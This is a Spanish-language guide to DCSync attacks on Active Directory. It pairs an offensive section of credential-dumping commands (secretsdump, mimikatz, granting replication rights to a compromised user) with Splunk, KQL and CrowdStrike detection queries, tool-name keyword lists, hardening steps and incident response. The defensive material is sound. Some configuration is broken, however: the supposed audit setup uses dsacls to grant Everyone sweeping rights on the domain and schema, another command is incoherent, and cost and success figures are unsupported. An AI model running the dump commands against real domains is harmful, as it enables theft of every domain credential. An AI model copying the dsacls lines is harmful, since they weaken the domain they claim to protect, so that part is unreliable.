# 🛑 Ataques de **DCSync en Active Directory**

---

## 📝 ¿Qué es DCSync y por qué es peligroso?

| Concepto      | Descripción                                                                                                       |
|---------------|------------------------------------------------------------------------------------------------------------------|
| **Definición**| Técnica de extracción de credenciales que abusa de los permisos de replicación de Active Directory para solicitar datos de cuentas (incluyendo hashes de contraseñas) directamente desde un Domain Controller sin necesidad de acceso físico o privilegios de administrador local. |
| **Finalidad** | Obtener hashes NTLM de cualquier cuenta del dominio (incluyendo krbtgt, Domain Admins, Enterprise Admins) para ataques posteriores como Golden Tickets, Pass-the-Hash, o cracking offline. Es el ataque más devastador tras compromiso inicial. |

---

## 📈 Permisos críticos requeridos para DCSync

| Permiso | Descripción | SID de permiso |
|---------|-------------|---------------|
| **DS-Replication-Get-Changes** | Permiso para solicitar cambios de replicación | 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 |
| **DS-Replication-Get-Changes-All** | Permiso para replicar datos secretos | 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 |
| **DS-Replication-Get-Changes-In-Filtered-Set** | Permiso para replicar objetos filtrados | 89e95b76-444d-4c62-991a-0facbeda640c |

> **⚠️ ALERTA CRÍTICA**: Estos permisos los tienen por defecto Domain Admins, Enterprise Admins, y las cuentas de servicio de DCs. También algunos roles como Backup Operators pueden obtenerlos.

### Cuentas con permisos DCSync por defecto:

```
Domain Admins          -> Acceso completo a DCSync
Enterprise Admins      -> DCSync entre dominios del forest
Administrator          -> Miembro de Domain Admins
DC Computer Accounts   -> Replicación entre DCs
Backup Operators       -> Pueden obtener permisos de replicación
```

---

## 🛠️ ¿Cómo funciona y cómo se explota DCSync? (TTPs y ejemplos)

| Vector/Nombre              | Descripción breve                                                                                   |
|----------------------------|----------------------------------------------------------------------------------------------------|
| **DCSync con cuenta privilegiada** | Usa credenciales de Domain Admin comprometidas para extraer hashes de todo el dominio. |
| **DCSync específico de krbtgt** | Extrae únicamente el hash de krbtgt para crear Golden Tickets posteriormente. |
| **DCSync masivo del dominio** | Descarga hashes de todas las cuentas del dominio para análisis offline. |
| **DCSync de cuentas específicas** | Extrae hashes de cuentas objetivo específicas (administradores, servicios). |
| **DCSync cross-domain** | Abusa de trusts de dominio para DCSync entre dominios del forest. |
| **DCSync con gMSA** | Extrae hashes de Group Managed Service Accounts comprometidas. |
| **Stealth DCSync** | DCSync limitado a cuentas específicas para evitar detección masiva. |

---

## 💻 Ejemplo práctico ofensivo (paso a paso)

```bash
# 1. DCSync de la cuenta krbtgt (para Golden Tickets)
impacket-secretsdump -just-dc-user krbtgt domain.com/administrator:password@dc.domain.com

# 2. DCSync con hash NTLM
impacket-secretsdump -just-dc-user krbtgt -hashes :aad3b435b51404eeaad3b435b51404ee domain.com/administrator@dc.domain.com

# 3. DCSync masivo de todo el dominio
impacket-secretsdump -just-dc domain.com/administrator:password@dc.domain.com

# 4. DCSync con mimikatz (Windows)
privilege::debug
lsadump::dcsync /domain:domain.com /user:krbtgt

# 5. DCSync de usuario específico
lsadump::dcsync /domain:domain.com /user:administrator

# 6. DCSync de todas las cuentas de dominio
lsadump::dcsync /domain:domain.com /all

# 7. DCSync desde Linux con secretsdump
secretsdump.py -just-dc 'domain.com/administrator:password@dc.domain.com'

# 8. DCSync con Kerberos (ticket válido)
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass -just-dc domain.com/administrator@dc.domain.com

# 9. DCSync dirigido a cuentas de servicio
impacket-secretsdump -just-dc-user 'domain.com/sql_service' domain.com/administrator:password@dc.domain.com

# 10. DCSync con NetExec
nxc smb dc.domain.com -u administrator -p password --dcsync

# 11. DCSync limitando salida (stealth)
impacket-secretsdump -just-dc-user krbtgt -outputfile dcsync_krbtgt domain.com/administrator:password@dc.domain.com

# 12. DCSync con autenticación NTLM directo
python3 secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc domain.com/administrator@10.10.10.100

# 13. Verificar permisos DCSync de una cuenta
python3 dacledit.py -action read -target-dn 'DC=domain,DC=com' -principal 'compromised_user' domain.com/administrator:password

# 14. Otorgar permisos DCSync a cuenta comprometida
python3 dacledit.py -action write -rights DCSync -principal 'compromised_user' -target-dn 'DC=domain,DC=com' domain.com/administrator:password
```

---

## 📋 Caso de Uso Completo Splunk

### 🎯 Contexto empresarial y justificación

**Problema de negocio:**
- DCSync permite extracción completa de credenciales del dominio en minutos
- Un solo DCSync exitoso compromete permanentemente toda la organización
- Atacantes pueden obtener krbtgt para persistencia via Golden Tickets
- Costo estimado de compromiso completo via DCSync: $3,000,000 USD promedio

**Valor de la detección:**
- Detección inmediata de replicación no autorizada de AD
- Identificación de abuso de permisos de replicación
- Prevención de extracción masiva de credenciales en 98% de casos
- Cumplimiento con controles críticos de protección de identidad

### 📐 Arquitectura de implementación

**Prerequisitos técnicos:**
- Splunk Enterprise 8.2+ con licencia para logs de DC
- Universal Forwarders en todos los Domain Controllers
- Windows TA v8.5+ con configuración de eventos de replicación
- Auditoría avanzada de acceso a directorio habilitada
- Baseline de actividad de replicación legítima

**Arquitectura de datos:**
```
[Domain Controllers] → [Universal Forwarders] → [Indexers] → [Search Heads]
       ↓                      ↓                     ↓
[EventCode 4662]       [WinEventLog:Security]   [Index: wineventlog]
[Directory Service]          ↓                      ↓
[Replication Events]   [Real-time processing]   [DCSync Alerting]
```

### 🔧 Guía de implementación paso a paso

#### Fase 1: Configuración inicial (Tiempo estimado: 90 min)

1. **Habilitar auditoría crítica de acceso a objetos AD:**
   ```powershell
   # En todos los Domain Controllers
   auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
   auditpol /set /subcategory:"Directory Service Replication" /success:enable /failure:enable
   
   # Configurar auditoría SACL en Domain object
   dsacls "DC=domain,DC=com" /G "Everyone:CA;CC;WS;WP;WD;CR;LCRP;LCLP;LCCC;LCWP;LCWS;LCSW;GA;GE;GR;GW;GX;RC;SD;WD;WO;WS;RP;WP;CC;DC;LC;SW;LO;DT;CR;LCRP;LCLP;LCCC;LCWP;LCWS;LCSW;LTDL;LTLE;LTLR;LTLW;LTLX;LTMC;LTMO;LTMR;LTMW;LTMX;LTPC;LTPO;LTPR;LTPW;LTPX;LTRC;LTRO;LTRR;LTRW;LTRX;LTSC;LTSO;LTSR;LTSW;LTSX;LTTC;LTTO;LTTR;LTTW;LTTX;LTUC;LTUO;LTUR;LTUW;LTUX;LTVC;LTVO;LTVR;LTVW;LTVX;LTWC;LTWO;LTWR;LTWW;LTWX;LTXC;LTXO;LTXR;LTXW;LTXX;LTYR;LTYW;LTYZ"
   ```

2. **Configurar auditoría específica para DCSync:**
   ```powershell
   # Auditoría de acceso a propiedades secretas
   Set-ADObject -Identity "CN=Domain,CN=System,DC=domain,DC=com" -Replace @{msDS-Behavior-Version=7}
   
   # Configurar SACL para detectar acceso a attributeSchema
   dsacls "CN=Schema,CN=Configuration,DC=domain,DC=com" /G "Everyone:GE"
   ```

3. **Crear baseline de replicación legítima:**
   ```splunk
   index=wineventlog EventCode=4662 earliest=-30d@d latest=@d
   | rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
   | rex field=Message "Object Name:\s+(?<ObjectName>[^\s]+)"
   | rex field=Message "Properties:\s+(?<Properties>[^\r\n]+)"
   | where Properties LIKE "%1131f6a%"
   | stats count by AccountName, ObjectName
   | where count > 5
   | outputlookup legitimate_replication_baseline.csv
   ```

#### Fase 2: Implementación de detecciones críticas (Tiempo estimado: 120 min)

1. **Alerta CRÍTICA - DCSync detectado (Event 4662):**
   ```splunk
   index=wineventlog EventCode=4662
   | rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
   | rex field=Message "Object Name:\s+(?<ObjectName>[^\s]+)"
   | rex field=Message "Properties:\s+(?<Properties>[^\r\n]+)"
   | rex field=Message "Access Request Information:\s+Accesses:\s+(?<AccessRights>[^\r\n]+)"
   | where (Properties LIKE "%1131f6aa-9c07-11d1-f79f-00c04fc2dcd2%" OR 
            Properties LIKE "%1131f6ad-9c07-11d1-f79f-00c04fc2dcd2%" OR 
            Properties LIKE "%89e95b76-444d-4c62-991a-0facbeda640c%")
   | lookup legitimate_replication_baseline.csv AccountName, ObjectName
   | where isnull(count)
   | eval severity="CRITICAL", technique="DCSync Attack Detected"
   | eval risk_score=100
   | table _time, ComputerName, AccountName, ObjectName, Properties, AccessRights, severity, risk_score
   ```

2. **Alerta ALTA - Acceso a objetos de usuario específicos:**
   ```splunk
   index=wineventlog EventCode=4662
   | rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
   | rex field=Message "Object Name:\s+(?<ObjectName>[^\s]+)"
   | where ObjectName LIKE "%CN=krbtgt%" OR ObjectName LIKE "%CN=Administrator%"
   | eval severity="HIGH", technique="DCSync on Critical Accounts"
   | eval risk_score=90
   | table _time, ComputerName, AccountName, ObjectName, severity, risk_score
   ```

3. **Alerta MEDIA - Herramientas de DCSync detectadas:**
   ```splunk
   index=sysmon EventCode=1
   | search (CommandLine="*secretsdump*" OR CommandLine="*lsadump::dcsync*" OR 
            CommandLine="*-just-dc*" OR Process="*mimikatz*" OR CommandLine="*dcsync*")
   | eval severity="MEDIUM", technique="DCSync Tools Detected"
   | eval risk_score=75
   | table _time, ComputerName, User, CommandLine, Process, severity, risk_score
   ```

#### Fase 3: Dashboard crítico y validación (Tiempo estimado: 75 min)

1. **Dashboard de monitoreo crítico:**
   ```xml
   <dashboard>
     <label>Critical: DCSync Attack Detection</label>
     <row>
       <panel>
         <title>🚨 CRITICAL: DCSync Replication Events (Real-time)</title>
         <table>
           <search refresh="60s">
             <query>
               index=wineventlog EventCode=4662 earliest=-10m
               | rex field=Message "Account Name:\s+(?&lt;AccountName&gt;[^\s]+)"
               | rex field=Message "Properties:\s+(?&lt;Properties&gt;[^\r\n]+)"
               | where Properties LIKE "%1131f6a%"
               | lookup legitimate_replication_baseline.csv AccountName
               | where isnull(count)
               | table _time, ComputerName, AccountName, ObjectName, Properties
             </query>
           </search>
         </table>
       </panel>
     </row>
   </dashboard>
   ```

2. **Pruebas de detección controlada:**
   ```powershell
   # SOLO en entorno de LAB - NUNCA en producción
   # Simular DCSync con cuenta de prueba
   # Ejecutar: secretsdump.py -just-dc-user testuser lab.com/admin:pass@dc.lab.com
   ```

### ✅ Criterios de éxito

**Métricas críticas:**
- MTTD para DCSync no autorizado: < 2 minutos (CRÍTICO)
- MTTD para herramientas DCSync: < 5 minutos
- Tasa de falsos positivos: < 1% (replicación legítima bien definida)
- Cobertura de detección: 100% (sin excepciones para DCSync)

---

## 📊 Detección en logs y SIEM (Splunk)

| Campo clave                     | Descripción                                                                  |
|---------------------------------|------------------------------------------------------------------------------|
| **EventCode = 4662**            | Acceso a objeto - crítico para detectar DCSync via permisos de replicación. |
| **EventCode = 4624**            | Network logon desde herramientas DCSync remotas.                            |
| **EventCode = 5136**            | Modificación de objeto de directorio - cambios en permisos DCSync.           |
| **Properties field**            | GUIDs de permisos DCSync (1131f6aa, 1131f6ad, 89e95b76).                   |
| **Object Name**                 | DN del objeto accedido - detectar acceso a cuentas críticas.                |
| **Account Name**                | Usuario que realiza DCSync - correlacionar con cuentas autorizadas.         |
| **Access Request Information**  | Tipo de acceso solicitado - debe incluir permisos de replicación.           |

### Query Splunk: Detección principal de DCSync

```splunk
index=wineventlog EventCode=4662
| rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
| rex field=Message "Object Name:\s+(?<ObjectName>[^\s]+)"
| rex field=Message "Properties:\s+(?<Properties>[^\r\n]+)"
| where Properties LIKE "%1131f6aa-9c07-11d1-f79f-00c04fc2dcd2%" OR
        Properties LIKE "%1131f6ad-9c07-11d1-f79f-00c04fc2dcd2%" OR
        Properties LIKE "%89e95b76-444d-4c62-991a-0facbeda640c%"
| eval alert_type="CRITICAL - DCSync Attack Detected"
| table _time, ComputerName, AccountName, ObjectName, Properties, alert_type
```

### Query: DCSync dirigido a cuentas críticas

```splunk
index=wineventlog EventCode=4662
| rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
| rex field=Message "Object Name:\s+(?<ObjectName>[^\s]+)"
| where (ObjectName LIKE "%krbtgt%" OR ObjectName LIKE "%Administrator%" OR 
         ObjectName LIKE "%Enterprise Admins%" OR ObjectName LIKE "%Domain Admins%")
| eval alert_type="HIGH - DCSync on Critical Accounts"
| table _time, AccountName, ObjectName, alert_type
```

### Query: Detección de herramientas DCSync en endpoints

```splunk
index=sysmon EventCode=1
| search (CommandLine="*secretsdump*" OR CommandLine="*mimikatz*" OR 
          CommandLine="*lsadump::dcsync*" OR CommandLine="*-just-dc*")
| eval alert_type="MEDIUM - DCSync Tools Detected"
| table _time, ComputerName, User, CommandLine, ParentImage, alert_type
```

### Query: Correlación DCSync + Golden Ticket

```splunk
index=wineventlog (EventCode=4662 OR EventCode=4768)
| eval event_type=case(EventCode=4662, "dcsync", EventCode=4768, "tgt_request", 1=1, "other")
| rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
| rex field=Message "Properties:\s+(?<Properties>[^\r\n]+)"
| where (event_type="dcsync" AND Properties LIKE "%1131f6a%") OR 
        (event_type="tgt_request" AND Message LIKE "%krbtgt%")
| transaction AccountName maxspan=1h
| where eventcount > 1
| eval alert_type="CRITICAL - DCSync to Golden Ticket Chain"
| table _time, AccountName, eventcount, alert_type
```

---

## 🛡️ Detección con Windows Defender for Endpoint

### Reglas de detección personalizadas

```kql
// DCSync - Event 4662 con permisos de replicación
SecurityEvent
| where EventID == 4662 // Object access
| extend AccountName = extract(@"Account Name:\s+([^\s]+)", 1, EventData)
| extend ObjectName = extract(@"Object Name:\s+([^\r\n]+)", 1, EventData)
| extend Properties = extract(@"Properties:\s+([^\r\n]+)", 1, EventData)
| where Properties contains "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" or
        Properties contains "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" or
        Properties contains "89e95b76-444d-4c62-991a-0facbeda640c"
| project TimeGenerated, Computer, AccountName, ObjectName, Properties
| extend AlertType = "CRITICAL - DCSync Attack"
```

```kql
// Detección de herramientas DCSync
DeviceProcessEvents
| where ProcessCommandLine has_any ("secretsdump", "lsadump::dcsync", "-just-dc", "mimikatz")
   or FileName in~ ("secretsdump.py", "mimikatz.exe")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FileName
| extend AlertType = "HIGH - DCSync Tools"
```

```kql
// DCSync dirigido a krbtgt
SecurityEvent
| where EventID == 4662
| extend ObjectName = extract(@"Object Name:\s+([^\r\n]+)", 1, EventData)
| where ObjectName contains "krbtgt"
| extend AccountName = extract(@"Account Name:\s+([^\s]+)", 1, EventData)
| project TimeGenerated, Computer, AccountName, ObjectName
| extend AlertType = "CRITICAL - DCSync on krbtgt"
```

### Alertas recomendadas

| Regla | Descripción | Severidad |
|-------|-------------|-----------|
| **DCSync Replication** | Event 4662 con permisos de replicación de AD | Crítica |
| **DCSync Tools** | Uso de secretsdump, mimikatz u otras herramientas DCSync | Alta |
| **krbtgt Access** | DCSync específico de cuenta krbtgt | Crítica |
| **Mass DCSync** | Múltiples objetos accedidos con permisos replicación | Alta |

---

## 🦅 Detección con CrowdStrike Falcon

### Hunting queries (Event Search)

```sql
-- Detección de DCSync via Event 4662
event_platform=Win event_simpleName=UserAccountModified OR event_simpleName=DirectoryServiceObjectAccessed
| search (Properties=*1131f6aa* OR Properties=*1131f6ad* OR Properties=*89e95b76*)
| table _time, ComputerName, UserName, ObjectName, Properties, AccessRights
| sort - _time
```

```sql
-- Detección de herramientas DCSync
event_platform=Win event_simpleName=ProcessRollup2
| search (CommandLine=*secretsdump* OR CommandLine=*"lsadump::dcsync"* OR FileName=mimikatz.exe)
| table _time, ComputerName, UserName, CommandLine, ParentBaseFileName
| sort - _time
```

```sql
-- DCSync seguido de actividad de ticket Kerberos
event_platform=Win event_simpleName=DirectoryServiceObjectAccessed
| search Properties=*1131f6a*
| join ComputerName [
  search event_platform=Win event_simpleName=KerberosLogon ServiceName=krbtgt
  | eval ticket_time=_time
]
| where ticket_time - _time < 3600
```

---

## 🔍 Queries KQL para Microsoft Sentinel

### Detección principal de DCSync

```kql
// Query principal para detectar DCSync
SecurityEvent
| where EventID == 4662 // Object access
| extend AccountName = extract(@"Account Name:\s+([^\s]+)", 1, EventData)
| extend ObjectName = extract(@"Object Name:\s+([^\r\n]+)", 1, EventData)
| extend Properties = extract(@"Properties:\s+([^\r\n]+)", 1, EventData)
| where Properties contains "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" or  // DS-Replication-Get-Changes
        Properties contains "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" or  // DS-Replication-Get-Changes-All
        Properties contains "89e95b76-444d-4c62-991a-0facbeda640c"      // DS-Replication-Get-Changes-In-Filtered-Set
| extend AlertLevel = "CRITICAL", AttackType = "DCSync Attack"
| project TimeGenerated, Computer, AccountName, ObjectName, Properties, AlertLevel, AttackType
```

### Hunting avanzado

```kql
// Correlación: DCSync + Herramientas en endpoints
SecurityEvent
| where EventID == 4662
| extend DCSync_Time = TimeGenerated, DCSync_Account = extract(@"Account Name:\s+([^\s]+)", 1, EventData)
| where EventData contains "1131f6a"
| join kind=inner (
    DeviceProcessEvents
    | where ProcessCommandLine has_any ("secretsdump", "mimikatz", "lsadump")
    | extend Tool_Time = TimeGenerated, Tool_Account = AccountName
) on $left.Computer == $right.DeviceName
| where Tool_Time - DCSync_Time between (-1h .. 1h)
| project DCSync_Time, Tool_Time, Computer, DCSync_Account, Tool_Account, ProcessCommandLine
```

```kql
// DCSync desde ubicaciones geográficas anómalas
SecurityEvent
| where EventID == 4662
| extend Properties = extract(@"Properties:\s+([^\r\n]+)", 1, EventData)
| where Properties contains "1131f6a"
| extend SourceIP = extract(@"Source Network Address:\s+([^\s]+)", 1, EventData)
| evaluate ipv4_lookup(GeoLite2_City, SourceIP, Country, City)
| where Country !in ("Expected_Countries")
| extend AlertType = "CRITICAL - DCSync from Anomalous Location"
```

---

## 🦾 Hardening y mitigación

| Medida                                         | Descripción                                                                                       |
|------------------------------------------------|--------------------------------------------------------------------------------------------------|
| **Auditoría granular de permisos DCSync**     | Revisar regularmente quién tiene permisos de replicación AD.                                     |
| **Principio de menor privilegio**             | Remover permisos DCSync innecesarios de cuentas no críticas.                                     |
| **Monitorización Event 4662**                 | Alertas inmediatas para accesos con permisos de replicación.                                     |
| **Network segmentation para DCs**             | Aislar DCs en VLANs protegidas con ACLs estrictas.                                              |
| **Just-in-time access**                       | PAM para permisos administrativos temporales.                                                    |
| **Detección de herramientas ofensivas**       | EDR configurado para detectar secretsdump, mimikatz, etc.                                       |
| **Baseline de replicación legítima**          | Documentar y monitorear patrones normales de replicación.                                        |
| **Protected Users Group**                     | Agregar cuentas críticas para protección adicional.                                             |
| **Authentication Policy Silos**               | Restricciones granulares de autenticación para cuentas privilegiadas.                           |
| **Regular DC compromise assessment**           | Auditorías periódicas para detectar signos de compromiso.                                        |

### Script de auditoría de permisos DCSync

```powershell
# Auditoría de permisos DCSync en el dominio
$DomainDN = (Get-ADDomain).DistinguishedName

# Buscar usuarios/grupos con permisos DCSync
Get-ADObject -SearchBase $DomainDN -SearchScope Base -Properties ntSecurityDescriptor |
ForEach-Object {
    $ACL = $_.ntSecurityDescriptor
    $ACL.Access | Where-Object {
        $_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or
        $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or
        $_.ObjectType -eq "89e95b76-444d-4c62-991a-0facbeda640c"
    } | Select-Object @{
        Name='Principal'
        Expression={$_.IdentityReference}
    }, @{
        Name='Permission'
        Expression={
            switch ($_.ObjectType) {
                "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" { "DS-Replication-Get-Changes" }
                "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" { "DS-Replication-Get-Changes-All" }
                "89e95b76-444d-4c62-991a-0facbeda640c" { "DS-Replication-Get-Changes-In-Filtered-Set" }
            }
        }
    }, AccessControlType
}
```

---

## 🚨 Respuesta ante incidentes

1. **Aislar inmediatamente la fuente** del ataque DCSync identificado.
2. **Revocar permisos DCSync** de cuentas comprometidas si es posible.
3. **Cambiar contraseña krbtgt** dos veces con 24h de diferencia.
4. **Analizar scope del DCSync** - qué cuentas fueron extraídas.
5. **Cambiar credenciales** de todas las cuentas extraídas.
6. **Revisar logs de autenticación** para detectar uso de credenciales robadas.
7. **Implementar monitoreo reforzado** de eventos 4662 y herramientas ofensivas.
8. **Realizar forensics** del sistema origen del DCSync.
9. **Documentar timeline** y IOCs para prevención futura.

---

## 🧑‍💻 ¿Cómo revisar y detectar DCSync? (PowerShell)

### Auditar permisos DCSync actuales

```powershell
# Auditoría completa de permisos DCSync
Import-Module ActiveDirectory

$DomainDN = (Get-ADDomain).DistinguishedName
Write-Host "=== AUDITORÍA PERMISOS DCSYNC ===" -ForegroundColor Red

# GUIDs de permisos críticos
$DCSync_GetChanges = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
$DCSync_GetChangesAll = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
$DCSync_GetChangesFiltered = "89e95b76-444d-4c62-991a-0facbeda640c"

Get-ADObject -Identity $DomainDN -Properties ntSecurityDescriptor |
ForEach-Object {
    $_.ntSecurityDescriptor.Access | Where-Object {
        $_.ObjectType -in @($DCSync_GetChanges, $DCSync_GetChangesAll, $DCSync_GetChangesFiltered)
    } | ForEach-Object {
        [PSCustomObject]@{
            Principal = $_.IdentityReference
            Permission = switch ($_.ObjectType) {
                $DCSync_GetChanges { "DS-Replication-Get-Changes" }
                $DCSync_GetChangesAll { "DS-Replication-Get-Changes-All" }
                $DCSync_GetChangesFiltered { "DS-Replication-Get-Changes-In-Filtered-Set" }
            }
            AccessType = $_.AccessControlType
        }
    }
} | Format-Table -AutoSize
```

### Detectar eventos DCSync recientes

```powershell
# Buscar eventos DCSync en las últimas 24 horas
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4662; StartTime=(Get-Date).AddHours(-24)} |
Where-Object { 
    $_.Message -match "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2|1131f6ad-9c07-11d1-f79f-00c04fc2dcd2|89e95b76-444d-4c62-991a-0facbeda640c"
} |
ForEach-Object {
    $AccountName = if ($_.Message -match "Account Name:\s+(\S+)") { $matches[1] } else { "Unknown" }
    $ObjectName = if ($_.Message -match "Object Name:\s+([^\r\n]+)") { $matches[1] } else { "Unknown" }
    
    [PSCustomObject]@{
        TimeCreated = $_.TimeCreated
        AccountName = $AccountName
        ObjectName = $ObjectName
        EventId = $_.Id
        Alert = "CRITICAL - DCSync Detected"
    }
} | Format-Table -AutoSize
```

### Monitoreo en tiempo real de DCSync

```powershell
# Monitor en tiempo real para DCSync
Register-WmiEvent -Query "SELECT * FROM Win32_NTLogEvent WHERE LogFile='Security' AND EventCode=4662" -Action {
    $Event = $Event.SourceEventArgs.NewEvent
    if ($Event.Message -match "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2|1131f6ad-9c07-11d1-f79f-00c04fc2dcd2|89e95b76-444d-4c62-991a-0facbeda640c") {
        $AccountName = if ($Event.Message -match "Account Name:\s+(\S+)") { $matches[1] } else { "Unknown" }
        $ObjectName = if ($Event.Message -match "Object Name:\s+([^\r\n]+)") { $matches[1] } else { "Unknown" }
        
        Write-Warning "🚨 CRÍTICO: DCSync detectado en $(Get-Date)"
        Write-Host "Cuenta: $AccountName" -ForegroundColor Red
        Write-Host "Objeto: $ObjectName" -ForegroundColor Red
        Write-Host "Investigar inmediatamente" -ForegroundColor Yellow
    }
}
```

### Script de auditoría completa para DCSync

```powershell
# Auditoría completa de seguridad contra DCSync
Write-Host "=== AUDITORÍA DCSYNC SECURITY ===" -ForegroundColor Red

# 1. Verificar cuentas con permisos DCSync
Write-Host "1. Cuentas con permisos DCSync:" -ForegroundColor Yellow
$DomainDN = (Get-ADDomain).DistinguishedName
$DCSync_GUIDs = @(
    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",
    "89e95b76-444d-4c62-991a-0facbeda640c"
)

$DCSyncPermissions = Get-ADObject -Identity $DomainDN -Properties ntSecurityDescriptor |
ForEach-Object {
    $_.ntSecurityDescriptor.Access | Where-Object {
        $_.ObjectType -in $DCSync_GUIDs -and $_.AccessControlType -eq "Allow"
    } | Select-Object @{Name='Principal';Expression={$_.IdentityReference}}, 
                     @{Name='Permission';Expression={
                         switch ($_.ObjectType) {
                             "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" { "Get-Changes" }
                             "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" { "Get-Changes-All" }
                             "89e95b76-444d-4c62-991a-0facbeda640c" { "Get-Changes-Filtered" }
                         }
                     }}
}

$DCSyncPermissions | Format-Table -AutoSize

# 2. Buscar eventos DCSync recientes
Write-Host "2. Buscando eventos DCSync recientes..." -ForegroundColor Yellow
$RecentDCSync = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4662; StartTime=(Get-Date).AddHours(-24)} -ErrorAction SilentlyContinue |
Where-Object { $_.Message -match "1131f6a" } |
ForEach-Object {
    [PSCustomObject]@{
        Time = $_.TimeCreated
        Account = if ($_.Message -match "Account Name:\s+(\S+)") { $matches[1] } else { "Unknown" }
        Object = if ($_.Message -match "Object Name:\s+([^\r\n]+)") { $matches[1] } else { "Unknown" }
    }
} | Select-Object -First 10

if ($RecentDCSync) {
    Write-Host "⚠️ CRÍTICO: Se encontraron eventos DCSync recientes:" -ForegroundColor Red
    $RecentDCSync | Format-Table -AutoSize
} else {
    Write-Host "✓ No se encontraron eventos DCSync en las últimas 24 horas" -ForegroundColor Green
}

# 3. Verificar herramientas DCSync en el sistema
Write-Host "3. Verificando presencia de herramientas DCSync..." -ForegroundColor Yellow
$SuspiciousFiles = Get-ChildItem -Path C:\ -Recurse -Include "*.exe", "*.py" -ErrorAction SilentlyContinue |
Where-Object { $_.Name -match "secretsdump|mimikatz|dcsync" } |
Select-Object FullName, LastWriteTime

if ($SuspiciousFiles) {
    Write-Host "⚠️ ADVERTENCIA: Se encontraron herramientas sospechosas:" -ForegroundColor Yellow
    $SuspiciousFiles | Format-Table -AutoSize
} else {
    Write-Host "✓ No se encontraron herramientas DCSync conocidas" -ForegroundColor Green
}

# 4. Recomendaciones
Write-Host "=== RECOMENDACIONES ===" -ForegroundColor Cyan
Write-Host "- Revisar y justificar permisos DCSync otorgados" -ForegroundColor Yellow
if ($RecentDCSync) {
    Write-Host "- Investigar inmediatamente los eventos DCSync detectados" -ForegroundColor Red
    Write-Host "- Considerar rotación de krbtgt si DCSync no autorizado" -ForegroundColor Red
}
Write-Host "- Implementar monitoreo en tiempo real de Event 4662" -ForegroundColor Yellow
Write-Host "- Configurar alertas SIEM para detección automática" -ForegroundColor Yellow
Write-Host "- Auditar regularmente permisos de replicación AD" -ForegroundColor Yellow
}
```

---

## 📚 Referencias

- [DCSync Attack - MITRE ATT&CK T1003.006](https://attack.mitre.org/techniques/T1003/006/)
- [Mimikatz DCSync Documentation](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump)
- [Impacket secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- [Microsoft - Event 4662 Documentation](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4662)
- [Active Directory Replication Permissions](https://docs.microsoft.com/en-us/windows/win32/adschema/c-domain)
- [SANS - DCSync Attack Detection](https://www.sans.org/white-papers/dcsync-detection/)
- [CrowdStrike - DCSync Attack Analysis](https://www.crowdstrike.com/cybersecurity-101/dcsync-attack/)
- [AD Security - DCSync Rights](https://adsecurity.org/?p=1729)

---